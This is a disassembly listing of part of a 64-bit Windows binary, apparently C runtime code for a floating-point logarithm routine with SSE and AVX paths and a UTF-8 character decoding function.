   14000b724:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000b72a:	83 3d cb e0 00 00 00 	cmpl   $0x0,0xe0cb(%rip)        # 0x1400197fc
   14000b731:	0f 85 e9 02 00 00    	jne    0x14000ba20
   14000b737:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000b73b:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000b73f:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000b744:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000b749:	66 0f fb 1d ef 85 00 	psubq  0x85ef(%rip),%xmm3        # 0x140013d40
   14000b750:	00 
   14000b751:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000b755:	66 0f 54 2d b3 85 00 	andpd  0x85b3(%rip),%xmm5        # 0x140013d10
   14000b75c:	00 
   14000b75d:	66 0f 2f 2d ab 85 00 	comisd 0x85ab(%rip),%xmm5        # 0x140013d10
   14000b764:	00 
   14000b765:	0f 84 85 02 00 00    	je     0x14000b9f0
   14000b76b:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000b76f:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000b773:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000b777:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000b77b:	0f 86 2f 02 00 00    	jbe    0x14000b9b0
   14000b781:	66 0f db 15 d7 85 00 	pand   0x85d7(%rip),%xmm2        # 0x140013d60
   14000b788:	00 
   14000b789:	f2 0f 5c 25 5f 86 00 	subsd  0x865f(%rip),%xmm4        # 0x140013df0
   14000b790:	00 
   14000b791:	66 0f 2f 35 e7 86 00 	comisd 0x86e7(%rip),%xmm6        # 0x140013e80
   14000b798:	00 
   14000b799:	0f 84 d8 01 00 00    	je     0x14000b977
   14000b79f:	66 0f 54 25 39 87 00 	andpd  0x8739(%rip),%xmm4        # 0x140013ee0
   14000b7a6:	00 
   14000b7a7:	4c 8b c8             	mov    %rax,%r9
   14000b7aa:	48 23 05 bf 85 00 00 	and    0x85bf(%rip),%rax        # 0x140013d70
   14000b7b1:	4c 23 0d c8 85 00 00 	and    0x85c8(%rip),%r9        # 0x140013d80
   14000b7b8:	49 d1 e1             	shl    $1,%r9
   14000b7bb:	49 03 c1             	add    %r9,%rax
   14000b7be:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000b7c3:	66 0f 2f 25 d5 86 00 	comisd 0x86d5(%rip),%xmm4        # 0x140013ea0
   14000b7ca:	00 
   14000b7cb:	0f 82 df 00 00 00    	jb     0x14000b8b0
   14000b7d1:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000b7d5:	66 0f eb 15 23 86 00 	por    0x8623(%rip),%xmm2        # 0x140013e00
   14000b7dc:	00 
   14000b7dd:	66 0f eb 0d 1b 86 00 	por    0x861b(%rip),%xmm1        # 0x140013e00
   14000b7e4:	00 
   14000b7e5:	4c 8d 0d 94 97 00 00 	lea    0x9794(%rip),%r9        # 0x140014f80
   14000b7ec:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000b7f0:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000b7f6:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000b7fa:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000b7fe:	4c 8d 0d 5b 87 00 00 	lea    0x875b(%rip),%r9        # 0x140013f60
   14000b805:	f2 0f 10 1d 63 86 00 	movsd  0x8663(%rip),%xmm3        # 0x140013e70
   14000b80c:	00 
   14000b80d:	f2 0f 10 0d 2b 86 00 	movsd  0x862b(%rip),%xmm1        # 0x140013e40
   14000b814:	00 
   14000b815:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000b819:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000b81d:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000b821:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000b825:	f2 0f 58 1d 33 86 00 	addsd  0x8633(%rip),%xmm3        # 0x140013e60
   14000b82c:	00 
   14000b82d:	f2 0f 58 0d fb 85 00 	addsd  0x85fb(%rip),%xmm1        # 0x140013e30
   14000b834:	00 
   14000b835:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000b839:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000b83d:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000b841:	f2 0f 58 1d 07 86 00 	addsd  0x8607(%rip),%xmm3        # 0x140013e50
   14000b848:	00 
   14000b849:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000b84d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000b851:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000b855:	f2 0f 10 2d 73 85 00 	movsd  0x8573(%rip),%xmm5        # 0x140013dd0
   14000b85c:	00 
   14000b85d:	f2 0f 59 0d 2b 85 00 	mulsd  0x852b(%rip),%xmm1        # 0x140013d90
   14000b864:	00 
   14000b865:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000b869:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000b86d:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000b873:	48 8d 15 f6 8e 00 00 	lea    0x8ef6(%rip),%rdx        # 0x140014770
   14000b87a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000b87f:	f2 0f 10 25 39 85 00 	movsd  0x8539(%rip),%xmm4        # 0x140013dc0
   14000b886:	00 
   14000b887:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000b88b:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000b88f:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000b893:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000b897:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000b89d:	48 83 c4 58          	add    $0x58,%rsp
   14000b8a1:	c3                   	ret
   14000b8a2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000b8a9:	1f 84 00 00 00 00 00 
   14000b8b0:	f2 0f 10 15 28 85 00 	movsd  0x8528(%rip),%xmm2        # 0x140013de0
   14000b8b7:	00 
   14000b8b8:	f2 0f 5c 05 30 85 00 	subsd  0x8530(%rip),%xmm0        # 0x140013df0
   14000b8bf:	00 
   14000b8c0:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000b8c4:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000b8c8:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000b8cc:	f2 0f 10 25 2c 86 00 	movsd  0x862c(%rip),%xmm4        # 0x140013f00
   14000b8d3:	00 
   14000b8d4:	f2 0f 10 2d 44 86 00 	movsd  0x8644(%rip),%xmm5        # 0x140013f20
   14000b8db:	00 
   14000b8dc:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000b8e0:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000b8e4:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000b8e8:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000b8ec:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b8f0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b8f4:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000b8f8:	f2 0f 58 25 f0 85 00 	addsd  0x85f0(%rip),%xmm4        # 0x140013ef0
   14000b8ff:	00 
   14000b900:	f2 0f 58 2d 08 86 00 	addsd  0x8608(%rip),%xmm5        # 0x140013f10
   14000b907:	00 
   14000b908:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b90c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b910:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000b914:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b918:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000b91c:	f2 0f 10 15 8c 84 00 	movsd  0x848c(%rip),%xmm2        # 0x140013db0
   14000b923:	00 
   14000b924:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000b928:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000b92c:	f2 0f 10 35 6c 84 00 	movsd  0x846c(%rip),%xmm6        # 0x140013da0
   14000b933:	00 
   14000b934:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000b938:	66 0f db 1d f0 85 00 	pand   0x85f0(%rip),%xmm3        # 0x140013f30
   14000b93f:	00 
   14000b940:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000b944:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000b948:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000b94c:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000b950:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b954:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000b958:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000b95c:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000b960:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000b964:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000b968:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000b96c:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000b972:	48 83 c4 58          	add    $0x58,%rsp
   14000b976:	c3                   	ret
   14000b977:	66 0f eb 15 71 84 00 	por    0x8471(%rip),%xmm2        # 0x140013df0
   14000b97e:	00 
   14000b97f:	f2 0f 5c 15 69 84 00 	subsd  0x8469(%rip),%xmm2        # 0x140013df0
   14000b986:	00 
   14000b987:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000b98b:	66 0f db 15 cd 83 00 	pand   0x83cd(%rip),%xmm2        # 0x140013d60
   14000b992:	00 
   14000b993:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000b998:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000b99d:	66 0f fa 2d eb 84 00 	psubd  0x84eb(%rip),%xmm5        # 0x140013e90
   14000b9a4:	00 
   14000b9a5:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000b9a9:	e9 f1 fd ff ff       	jmp    0x14000b79f
   14000b9ae:	66 90                	xchg   %ax,%ax
   14000b9b0:	75 1e                	jne    0x14000b9d0
   14000b9b2:	f2 0f 10 0d 46 83 00 	movsd  0x8346(%rip),%xmm1        # 0x140013d00
   14000b9b9:	00 
   14000b9ba:	44 8b 05 7f 85 00 00 	mov    0x857f(%rip),%r8d        # 0x140013f40
   14000b9c1:	e8 1a 0b 00 00       	call   0x14000c4e0
   14000b9c6:	eb 48                	jmp    0x14000ba10
   14000b9c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b9cf:	00 
   14000b9d0:	f2 0f 10 0d 48 83 00 	movsd  0x8348(%rip),%xmm1        # 0x140013d20
   14000b9d7:	00 
   14000b9d8:	44 8b 05 65 85 00 00 	mov    0x8565(%rip),%r8d        # 0x140013f44
   14000b9df:	e8 fc 0a 00 00       	call   0x14000c4e0
   14000b9e4:	eb 2a                	jmp    0x14000ba10
   14000b9e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000b9ed:	00 00 00 
   14000b9f0:	48 3b 05 19 83 00 00 	cmp    0x8319(%rip),%rax        # 0x140013d10
   14000b9f7:	74 17                	je     0x14000ba10
   14000b9f9:	48 3b 05 00 83 00 00 	cmp    0x8300(%rip),%rax        # 0x140013d00
   14000ba00:	74 ce                	je     0x14000b9d0
   14000ba02:	48 0b 05 27 83 00 00 	or     0x8327(%rip),%rax        # 0x140013d30
   14000ba09:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000ba0e:	66 90                	xchg   %ax,%ax
   14000ba10:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000ba16:	48 83 c4 58          	add    $0x58,%rsp
   14000ba1a:	c3                   	ret
   14000ba1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000ba20:	48 33 c0             	xor    %rax,%rax
   14000ba23:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000ba28:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000ba2d:	c5 e1 fb 1d 0b 83 00 	vpsubq 0x830b(%rip),%xmm3,%xmm3        # 0x140013d40
   14000ba34:	00 
   14000ba35:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000ba39:	c5 f9 db 2d cf 82 00 	vpand  0x82cf(%rip),%xmm0,%xmm5        # 0x140013d10
   14000ba40:	00 
   14000ba41:	c5 f9 2f 2d c7 82 00 	vcomisd 0x82c7(%rip),%xmm5        # 0x140013d10
   14000ba48:	00 
   14000ba49:	0f 84 41 02 00 00    	je     0x14000bc90
   14000ba4f:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000ba53:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000ba57:	0f 86 e3 01 00 00    	jbe    0x14000bc40
   14000ba5d:	c5 f9 db 15 fb 82 00 	vpand  0x82fb(%rip),%xmm0,%xmm2        # 0x140013d60
   14000ba64:	00 
   14000ba65:	c5 fb 5c 25 83 83 00 	vsubsd 0x8383(%rip),%xmm0,%xmm4        # 0x140013df0
   14000ba6c:	00 
   14000ba6d:	c5 f9 2f 35 0b 84 00 	vcomisd 0x840b(%rip),%xmm6        # 0x140013e80
   14000ba74:	00 
   14000ba75:	0f 84 8e 01 00 00    	je     0x14000bc09
   14000ba7b:	c5 f9 db 0d ed 82 00 	vpand  0x82ed(%rip),%xmm0,%xmm1        # 0x140013d70
   14000ba82:	00 
   14000ba83:	c5 f9 db 1d f5 82 00 	vpand  0x82f5(%rip),%xmm0,%xmm3        # 0x140013d80
   14000ba8a:	00 
   14000ba8b:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000ba90:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000ba94:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000ba99:	c5 d9 db 25 3f 84 00 	vpand  0x843f(%rip),%xmm4,%xmm4        # 0x140013ee0
   14000baa0:	00 
   14000baa1:	c5 f9 2f 25 f7 83 00 	vcomisd 0x83f7(%rip),%xmm4        # 0x140013ea0
   14000baa8:	00 
   14000baa9:	0f 82 b1 00 00 00    	jb     0x14000bb60
   14000baaf:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000bab3:	c5 e9 eb 15 45 83 00 	vpor   0x8345(%rip),%xmm2,%xmm2        # 0x140013e00
   14000baba:	00 
   14000babb:	c5 f1 eb 0d 3d 83 00 	vpor   0x833d(%rip),%xmm1,%xmm1        # 0x140013e00
   14000bac2:	00 
   14000bac3:	4c 8d 0d b6 94 00 00 	lea    0x94b6(%rip),%r9        # 0x140014f80
   14000baca:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000bace:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000bad4:	4c 8d 0d 85 84 00 00 	lea    0x8485(%rip),%r9        # 0x140013f60
   14000badb:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000badf:	c5 fb 10 1d 89 83 00 	vmovsd 0x8389(%rip),%xmm3        # 0x140013e70
   14000bae6:	00 
   14000bae7:	c5 fb 10 2d 51 83 00 	vmovsd 0x8351(%rip),%xmm5        # 0x140013e40
   14000baee:	00 
   14000baef:	c4 e2 f1 a9 1d 68 83 	vfmadd213sd 0x8368(%rip),%xmm1,%xmm3        # 0x140013e60
   14000baf6:	00 00 
   14000baf8:	c4 e2 f1 a9 2d ff 82 	vfmadd213sd 0x82ff(%rip),%xmm1,%xmm5        # 0x140013e00
   14000baff:	00 00 
   14000bb01:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000bb05:	c4 e2 f1 a9 1d 42 83 	vfmadd213sd 0x8342(%rip),%xmm1,%xmm3        # 0x140013e50
   14000bb0c:	00 00 
   14000bb0e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000bb12:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000bb17:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000bb1c:	c5 f3 59 0d 6c 82 00 	vmulsd 0x826c(%rip),%xmm1,%xmm1        # 0x140013d90
   14000bb23:	00 
   14000bb24:	c5 fb 10 2d a4 82 00 	vmovsd 0x82a4(%rip),%xmm5        # 0x140013dd0
   14000bb2b:	00 
   14000bb2c:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000bb31:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000bb37:	48 8d 15 32 8c 00 00 	lea    0x8c32(%rip),%rdx        # 0x140014770
   14000bb3e:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000bb43:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000bb47:	c4 e2 c9 b9 05 70 82 	vfmadd231sd 0x8270(%rip),%xmm6,%xmm0        # 0x140013dc0
   14000bb4e:	00 00 
   14000bb50:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000bb54:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bb5a:	48 83 c4 58          	add    $0x58,%rsp
   14000bb5e:	c3                   	ret
   14000bb5f:	90                   	nop
   14000bb60:	c5 fb 10 15 78 82 00 	vmovsd 0x8278(%rip),%xmm2        # 0x140013de0
   14000bb67:	00 
   14000bb68:	c5 fb 5c 05 80 82 00 	vsubsd 0x8280(%rip),%xmm0,%xmm0        # 0x140013df0
   14000bb6f:	00 
   14000bb70:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000bb74:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000bb78:	c5 fb 10 25 80 83 00 	vmovsd 0x8380(%rip),%xmm4        # 0x140013f00
   14000bb7f:	00 
   14000bb80:	c5 fb 10 2d 98 83 00 	vmovsd 0x8398(%rip),%xmm5        # 0x140013f20
   14000bb87:	00 
   14000bb88:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000bb8c:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000bb90:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000bb94:	c4 e2 e9 a9 25 53 83 	vfmadd213sd 0x8353(%rip),%xmm2,%xmm4        # 0x140013ef0
   14000bb9b:	00 00 
   14000bb9d:	c4 e2 e9 a9 2d 6a 83 	vfmadd213sd 0x836a(%rip),%xmm2,%xmm5        # 0x140013f10
   14000bba4:	00 00 
   14000bba6:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000bbaa:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000bbae:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000bbb2:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000bbb6:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000bbba:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000bbbe:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000bbc2:	c5 f9 db 1d 66 83 00 	vpand  0x8366(%rip),%xmm0,%xmm3        # 0x140013f30
   14000bbc9:	00 
   14000bbca:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000bbce:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000bbd2:	c5 db 59 0d c6 81 00 	vmulsd 0x81c6(%rip),%xmm4,%xmm1        # 0x140013da0
   14000bbd9:	00 
   14000bbda:	c5 db 59 25 ce 81 00 	vmulsd 0x81ce(%rip),%xmm4,%xmm4        # 0x140013db0
   14000bbe1:	00 
   14000bbe2:	c5 e3 59 05 c6 81 00 	vmulsd 0x81c6(%rip),%xmm3,%xmm0        # 0x140013db0
   14000bbe9:	00 
   14000bbea:	c5 e3 59 1d ae 81 00 	vmulsd 0x81ae(%rip),%xmm3,%xmm3        # 0x140013da0
   14000bbf1:	00 
   14000bbf2:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000bbf6:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000bbfa:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000bbfe:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc04:	48 83 c4 58          	add    $0x58,%rsp
   14000bc08:	c3                   	ret
   14000bc09:	c5 e9 eb 15 df 81 00 	vpor   0x81df(%rip),%xmm2,%xmm2        # 0x140013df0
   14000bc10:	00 
   14000bc11:	c5 eb 5c 15 d7 81 00 	vsubsd 0x81d7(%rip),%xmm2,%xmm2        # 0x140013df0
   14000bc18:	00 
   14000bc19:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000bc1e:	c5 e9 db 15 3a 81 00 	vpand  0x813a(%rip),%xmm2,%xmm2        # 0x140013d60
   14000bc25:	00 
   14000bc26:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000bc2a:	c5 d1 fa 2d 5e 82 00 	vpsubd 0x825e(%rip),%xmm5,%xmm5        # 0x140013e90
   14000bc31:	00 
   14000bc32:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000bc36:	e9 40 fe ff ff       	jmp    0x14000ba7b
   14000bc3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000bc40:	75 2e                	jne    0x14000bc70
   14000bc42:	c5 fb 10 0d b6 80 00 	vmovsd 0x80b6(%rip),%xmm1        # 0x140013d00
   14000bc49:	00 
   14000bc4a:	44 8b 05 ef 82 00 00 	mov    0x82ef(%rip),%r8d        # 0x140013f40
   14000bc51:	e8 8a 08 00 00       	call   0x14000c4e0
   14000bc56:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc5c:	48 83 c4 58          	add    $0x58,%rsp
   14000bc60:	c3                   	ret
   14000bc61:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000bc68:	0f 1f 84 00 00 00 00 
   14000bc6f:	00 
   14000bc70:	c5 fb 10 0d a8 80 00 	vmovsd 0x80a8(%rip),%xmm1        # 0x140013d20
   14000bc77:	00 
   14000bc78:	44 8b 05 c5 82 00 00 	mov    0x82c5(%rip),%r8d        # 0x140013f44
   14000bc7f:	e8 5c 08 00 00       	call   0x14000c4e0
   14000bc84:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc8a:	48 83 c4 58          	add    $0x58,%rsp
   14000bc8e:	c3                   	ret
   14000bc8f:	90                   	nop
   14000bc90:	48 3b 05 79 80 00 00 	cmp    0x8079(%rip),%rax        # 0x140013d10
   14000bc97:	74 27                	je     0x14000bcc0
   14000bc99:	48 3b 05 60 80 00 00 	cmp    0x8060(%rip),%rax        # 0x140013d00
   14000bca0:	74 ce                	je     0x14000bc70
   14000bca2:	48 0b 05 87 80 00 00 	or     0x8087(%rip),%rax        # 0x140013d30
   14000bca9:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000bcae:	44 8b 05 93 82 00 00 	mov    0x8293(%rip),%r8d        # 0x140013f48
   14000bcb5:	e8 26 08 00 00       	call   0x14000c4e0
   14000bcba:	eb 04                	jmp    0x14000bcc0
   14000bcbc:	0f 1f 40 00          	nopl   0x0(%rax)
   14000bcc0:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bcc6:	48 83 c4 58          	add    $0x58,%rsp
   14000bcca:	c3                   	ret
   14000bccb:	cc                   	int3
   14000bccc:	48 83 22 00          	andq   $0x0,(%rdx)
   14000bcd0:	48 8b c1             	mov    %rcx,%rax
   14000bcd3:	c3                   	ret
   14000bcd4:	48 83 21 00          	andq   $0x0,(%rcx)
   14000bcd8:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000bcdc:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000bce0:	c7 42 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rdx)
   14000bce7:	c3                   	ret
   14000bce8:	40 53                	rex push %rbx
   14000bcea:	55                   	push   %rbp
   14000bceb:	56                   	push   %rsi
   14000bcec:	57                   	push   %rdi
   14000bced:	41 54                	push   %r12
   14000bcef:	41 56                	push   %r14
   14000bcf1:	41 57                	push   %r15
   14000bcf3:	48 83 ec 40          	sub    $0x40,%rsp
   14000bcf7:	48 8b 05 42 c3 00 00 	mov    0xc342(%rip),%rax        # 0x140018040
   14000bcfe:	48 33 c4             	xor    %rsp,%rax
   14000bd01:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000bd06:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   14000bd0d:	00 
   14000bd0e:	4c 8d 15 db da 00 00 	lea    0xdadb(%rip),%r10        # 0x1400197f0
   14000bd15:	45 33 db             	xor    %r11d,%r11d
   14000bd18:	48 8d 3d 33 2e 00 00 	lea    0x2e33(%rip),%rdi        # 0x14000eb52
   14000bd1f:	4d 85 c9             	test   %r9,%r9
   14000bd22:	48 8b c2             	mov    %rdx,%rax
   14000bd25:	4c 8b e2             	mov    %rdx,%r12
   14000bd28:	4d 0f 45 d1          	cmovne %r9,%r10
   14000bd2c:	48 85 d2             	test   %rdx,%rdx
   14000bd2f:	41 8d 6b 01          	lea    0x1(%r11),%ebp
   14000bd33:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000bd37:	44 8b fd             	mov    %ebp,%r15d
   14000bd3a:	4d 0f 45 f8          	cmovne %r8,%r15
   14000bd3e:	48 f7 d8             	neg    %rax
   14000bd41:	4d 1b f6             	sbb    %r14,%r14
   14000bd44:	4c 23 f1             	and    %rcx,%r14
   14000bd47:	4d 85 ff             	test   %r15,%r15
   14000bd4a:	75 0c                	jne    0x14000bd58
   14000bd4c:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000bd53:	e9 4d 01 00 00       	jmp    0x14000bea5
   14000bd58:	66 45 39 5a 06       	cmp    %r11w,0x6(%r10)
   14000bd5d:	75 68                	jne    0x14000bdc7
   14000bd5f:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000bd63:	48 ff c7             	inc    %rdi
   14000bd66:	45 84 c9             	test   %r9b,%r9b
   14000bd69:	78 17                	js     0x14000bd82
   14000bd6b:	4d 85 f6             	test   %r14,%r14
   14000bd6e:	74 03                	je     0x14000bd73
   14000bd70:	45 89 0e             	mov    %r9d,(%r14)
   14000bd73:	45 84 c9             	test   %r9b,%r9b
   14000bd76:	41 0f 95 c3          	setne  %r11b
   14000bd7a:	49 8b c3             	mov    %r11,%rax
   14000bd7d:	e9 23 01 00 00       	jmp    0x14000bea5
   14000bd82:	41 8a c1             	mov    %r9b,%al
   14000bd85:	24 e0                	and    $0xe0,%al
   14000bd87:	3c c0                	cmp    $0xc0,%al
   14000bd89:	75 05                	jne    0x14000bd90
   14000bd8b:	41 b0 02             	mov    $0x2,%r8b
   14000bd8e:	eb 1e                	jmp    0x14000bdae
   14000bd90:	41 8a c1             	mov    %r9b,%al
   14000bd93:	24 f0                	and    $0xf0,%al
   14000bd95:	3c e0                	cmp    $0xe0,%al
   14000bd97:	75 05                	jne    0x14000bd9e
   14000bd99:	41 b0 03             	mov    $0x3,%r8b
   14000bd9c:	eb 10                	jmp    0x14000bdae
   14000bd9e:	41 8a c1             	mov    %r9b,%al
   14000bda1:	24 f8                	and    $0xf8,%al
   14000bda3:	3c f0                	cmp    $0xf0,%al
   14000bda5:	0f 85 ef 00 00 00    	jne    0x14000be9a
   14000bdab:	41 b0 04             	mov    $0x4,%r8b
   14000bdae:	41 0f b6 c0          	movzbl %r8b,%eax
   14000bdb2:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000bdb7:	2b c8                	sub    %eax,%ecx
   14000bdb9:	8b d5                	mov    %ebp,%edx
   14000bdbb:	d3 e2                	shl    %cl,%edx
   14000bdbd:	41 8a d8             	mov    %r8b,%bl
   14000bdc0:	2b d5                	sub    %ebp,%edx
   14000bdc2:	41 23 d1             	and    %r9d,%edx
   14000bdc5:	eb 29                	jmp    0x14000bdf0
   14000bdc7:	45 8a 42 04          	mov    0x4(%r10),%r8b
   14000bdcb:	41 8b 12             	mov    (%r10),%edx
   14000bdce:	41 8a 5a 06          	mov    0x6(%r10),%bl
   14000bdd2:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000bdd6:	3c 02                	cmp    $0x2,%al
   14000bdd8:	0f 87 bc 00 00 00    	ja     0x14000be9a
   14000bdde:	40 3a dd             	cmp    %bpl,%bl
   14000bde1:	0f 82 b3 00 00 00    	jb     0x14000be9a
   14000bde7:	41 3a d8             	cmp    %r8b,%bl
   14000bdea:	0f 83 aa 00 00 00    	jae    0x14000be9a
   14000bdf0:	0f b6 eb             	movzbl %bl,%ebp
   14000bdf3:	49 3b ef             	cmp    %r15,%rbp
   14000bdf6:	44 8b cd             	mov    %ebp,%r9d
   14000bdf9:	4d 0f 43 cf          	cmovae %r15,%r9
